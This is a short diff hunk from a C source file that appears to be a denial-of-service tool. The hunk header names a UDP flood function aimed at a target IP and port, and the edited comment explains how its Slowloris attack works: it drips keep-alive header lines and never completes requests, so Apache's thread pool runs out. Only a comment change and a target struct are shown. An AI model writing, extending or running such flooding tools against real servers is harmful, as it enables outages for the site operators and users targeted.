@@ -250,7 +250,10 @@ void udp_flood(const char *target_ip, int target_port, int duration) {
 
 /* ── Slowloris (C implementation) ───────────────────────────── */
 /* Maintains a pool of half-open HTTP connections by dripping    */
-/* one header byte at a time — exhausts Apache's thread pool.   */
+/* one keep-alive header line ("X-a: N\r\n") every              */
+/* SLOWLORIS_INTERVAL seconds — exhausts Apache's thread pool.  */
+/* The request is never completed (no final \r\n\r\n is sent),  */
+/* so Apache holds the connection thread open indefinitely.      */
 typedef struct {
     char target_ip[64];
     int  target_port;
